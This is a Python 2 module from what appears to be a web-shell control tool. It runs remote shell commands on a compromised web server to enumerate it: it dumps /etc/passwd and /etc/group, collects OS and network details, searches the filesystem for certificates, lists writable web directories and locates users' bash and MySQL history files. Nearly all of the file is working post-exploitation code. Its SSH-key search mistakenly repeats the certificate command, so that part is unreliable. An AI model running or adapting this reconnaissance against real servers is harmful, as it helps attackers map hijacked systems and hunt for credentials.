from core.libs.termcolor import cprint
from core.libs.request_handler import make_request
from core.modules.shell_handler import linux


class Enumerate(object):
    def list(self):
        print '\n[i] Usage: @enum [module]'
        print '[i] Modules:'
        print '[i] \tgroup      \t\tGroups for user accounts on the system'
        print '[i] \thistory   \t\tList previously entered commands (~/.*-history files)'
        print '[i] \tkeys      \t\tList SSH keys & SSL certificates'
        print '[i] \tnetwork        \t\tGeneral networking infomation about the system'
        print '[i] \tos        \t\tGeneral operating system infomation'
        print '[i] \tpasswd        \t\tUser accounts on the system'
        print '[i] \tsystem    \t\tGeneral infomation about the system'
        print '[i] \twritable\t\tList writable paths within the document\'s root directory'

    def group(self):
        cmd = 'cat /etc/group;'
        groups = make_request.get_page_source(cmd)

        header = '{0:15} | {1:11} | {2:8} | {3:8} |'.format("Group Name", "Password", "Group ID", "Group List")
        line = "-" * len(header)

        cprint('[+] Total number of groups: {0}'.format(len(groups)), 'magenta')

        cprint(line, 'green')
        cprint(header, 'green')
        cprint(line, 'green')
        c = 1
        for group in groups:
            gname = group.split(':')[0]
            passwd = group.split(':')[1]
            if passwd == "x":
                passwd = "*In shadow*"
            guid = group.split(':')[2]
            glist = group.split(':')[3]
            cprint('{0:15} | {1:11} | {2:8} | {3:8} {4:2}|'.format(gname, passwd, guid, glist, ' '), 'green')
            c += 1
        cprint(line, 'green')

    def passwd(self):
        cmd = 'cat /etc/passwd;'
        users = make_request.get_page_source(cmd)

        header = '{0:17} | {1:11} | {2:7} | {3:8} | {4:35} | {5:28} | {6}'.format(
                "Username",
                "Password",
                "User ID",
                "Group ID",
                "User Info",
                "Home Directory",
                "Shell",)
        line = "-" * len(header)

        cprint('[+] Total number of users: {0}'.format(len(users)), 'magenta')

        cprint(line, 'green')
        cprint(header, 'green')
        cprint(line, 'green')
        c = 1
        for user in users:
            uname = user.split(':')[0]
            passwd = user.split(':')[1]
            if passwd == "x":
                passwd = "*In shadow*"
            uid = user.split(':')[2]
            guid = user.split(':')[3]
            uinfo = user.split(':')[4]
            home = user.split(':')[5]
            shell = user.split(':')[6]
            cprint('{0:17} | {1:11} | {2:7} | {3:8} | {4:35} | {5:28} | {6}'.format(
                    uname,
                    passwd,
                    uid,
                    guid,
                    uinfo,
                    home,
                    shell,), 'green')
            c += 1
        cprint(line, 'green')

    def system(self):
        cmd = 'bash -c "input=\$(uptime); if [[ \$input == *day* ]]; then out=\$(echo \$input | awk \'{print \$3\\" days\\"}\'); if [[ \$input == *min* ]]; then out=\$(echo \\"\$out and \\" && echo \$input | awk \'{print \$5\\" minutes\\"}\'); else out=\$(echo \\"\$out, \\" && echo \$input | awk \'{print \$5}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi elif [[ \$input == *min* ]]; then out=\$(echo \$input | awk \'{print \$3\\" minutes\\"}\'); else out=\$(echo \$input | awk \'{print \$3}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi; echo \$out;" ;'
        cmd += "awk '{print ($1/(60*60*24))/($2/(60*60*24))*100 \"%\"}' /proc/uptime;"
        cmd += "w -h | wc -l;"
        cmd += "wc -l /etc/passwd | awk '{print $1}';"
        cmd += "wc -l /etc/group | awk '{print $1}';"
        cmd += "awk '{print $1 \" \" $2 \" \" $3}' /proc/loadavg;"
        cmd += "free -m | grep 'buffers/cache' | awk '{print $3*100/($3+$4)}';"
        cmd += "netstat -tn | grep ESTABLISHED | wc -l | awk '{print $1}';"
        cmd += "netstat -atn | grep LISTEN | wc -l | awk \"{print $1}\";"
        cmd += "awk '{split($4,a,\"/\"); print a[1];}' /proc/loadavg;"
        cmd += "awk '{split($4,a,\"/\"); print a[2];}' /proc/loadavg;"

        system = make_request.get_page_source(cmd)

        output = '\n[+] Uptime: {0}\n'.format(system[0])
        output += '[+] Idletime: {0}\n'.format(system[1])
        output += '[+] Users Logged in: {0}\n'.format(system[2])
        output += '[+] Total Users: {0}\n'.format(system[3])
        output += '[+] Total Groups: {0}\n'.format(system[4])
        output += '[+] CPU Load (1, 5, 15 mins): {0}\n'.format(system[5])
        output += '[+] Memory Load (Used %): {0}\n'.format(system[6])
        output += '[+] Established TCP Connections: {0}\n'.format(system[7])
        output += '[+] Listening TCP Services: {0}\n'.format(system[8])
        output += '[+] User Processors: {0}\n'.format(system[9])
        output += '[+] Total Processor: {0}'.format(system[10])

        cprint(output, 'green')

    def ip(self):
        cmd = "ip addr show | grep inet | awk '{printf \", \" $2}' | sed 's/^, *//' && echo;"
        cmd += "curl http://ifconfig.me/ip;"
        cmd += "cat /etc/resolv.conf | grep nameserver | awk '{printf \", \" $2}' | sed 's/^, *//' && echo;"
        cmd += "/sbin/route -n | awk '{print $2}' | grep -v 0.0.0.0 | grep -v IP | grep -v Gateway | head -n 1;"
        #grep -q "BOOTPROTO=dhcp" /etc/sysconfig/network-scripts/ifcfg-eth0 2>/dev/null
        #grep -q "inet dhcp" /etc/network/interfaces 2>/dev/null
        cmd += 'dhcp_ip=`grep dhcp-server /var/lib/dhcp*/dhclient.* 2>/dev/null | uniq | awk \'{print $4}\' | tr -d ";"`; if [ $dhcp_ip ] ; then echo "Yes ($dhcp_ip)"; else echo "No"; fi;'

        ip = make_request.get_page_source(cmd)

        output = '\n[+] Internal IP/subnet: {0}\n'.format(ip[0])
        output += '[+] External IP: {0}\n'.format(ip[1])
        output += '[+] DNS: {0}\n'.format(ip[2])
        output += '[+] Gateway: {0}\n'.format(ip[3])
        output += '[+] DHCP?: {0}'.format(ip[4])

        cprint(output, 'green')

    def os(self):
        cmd = "hostname;"
        cmd += "uname -a;"
        #cmd += "grep DISTRIB_DESCRIPTION /etc/*-release | head -n 1;"
        cmd += "cat /etc/*-release | head -n 1 | sed 's/DISTRIB_ID=//';"
        cmd += "date;"
        cmd += "zdump UTC | sed 's/UTC  //';"
        #cmd += "python -c 'import locale; print locale.getdefaultlocale()[0];';"
        cmd += "echo $LANG;"

        os = make_request.get_page_source(cmd)

        output = '\n[+] Hostname: {0}\n'.format(os[0])
        output += '[+] Kernel: {0}\n'.format(os[1])
        output += '[+] OS: {0}\n'.format(os[2])
        output += '[+] Local Time: {0}\n'.format(os[3])
        output += '[+] Timezone (UTC): {0}\n'.format(os[4])
        output += '[+] Language: {0}'.format(os[5])

        cprint(output, 'green')

    def keys(self):
        cmd = "find / -type f -print0 | xargs -0 -I '{}' bash -c 'openssl x509 -in {} -noout > /dev/null 2>&1; [[ $? == '0' ]] && echo \"{}\"'"
        self.ssl = make_request.get_page_source(cmd)
        if self.ssl:
            c = 1
            for path in self.ssl:
                print '{0:2d}.) {1}'.format(c, path)
                c += 1
        else:
            cprint('\n[!] Didn\'t find any SSL certs', 'red')

        cmd = "find / -type f -print0 | xargs -0 -I '{}' bash -c 'openssl x509 -in {} -noout > /dev/null 2>&1; [[ $? == '0' ]] && echo \"{}\"'"
        self.sshpub = make_request.get_page_source(cmd)
        if self.sshpub:
            c = 1
            for path in self.sshpub:
                print '{0:2d}.) {1}'.format(c, path)
                c += 1
        else:
            cprint('\n[!] Didn\'t find any public SSH keys', 'red')

        # Private keys
        #find / -type f -exec bash -c 'ssh-keygen -yf {} >/dev/null 2>&1' \; -exec bash -c 'echo {}' \;        #grep -r "SSH PRIVATE KEY FILE FORMAT" /{etc,home,root} 2> /dev/null | wc -l    # find / -name "*host_key*"

    # A method to get all writable directories within CWD
    def writable(self):
        cmd = "find {0} -depth -perm -0002 -type d".format(linux.get_doc_root())
        self.writable = make_request.get_page_source(cmd)
        if self.writable:
            c = 1
            for path in self.writable:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
        else:
            cprint('\n[!] Didn\'t find any wriable directories', 'red')

    def history(self):
        cmd = 'for i in $(cut -d: -f6 /etc/passwd | sort | uniq); do [ -f $i/.bash_history ] && echo "bash_history: $i"; [ -f $i/.nano_history ] && echo "nano_history: $i"; [ -f $i/.atftp_history ] && echo "atftp_history: $i"; [ -f $i/.mysql_history ] && echo "mysql_history: $i"; [ -f $i/.php_history ] && echo "php_history: $i";done'
        self.history = make_request.get_page_source(cmd)
        if self.history:
            c = 1
            for path in self.history:
                cprint('{0:2d}.) {1}'.format(c, path), 'green')
                c += 1
        else:
            cprint('\n[!] Didn\'t find any \'history\' files', 'red')

enumerate = Enumerate()
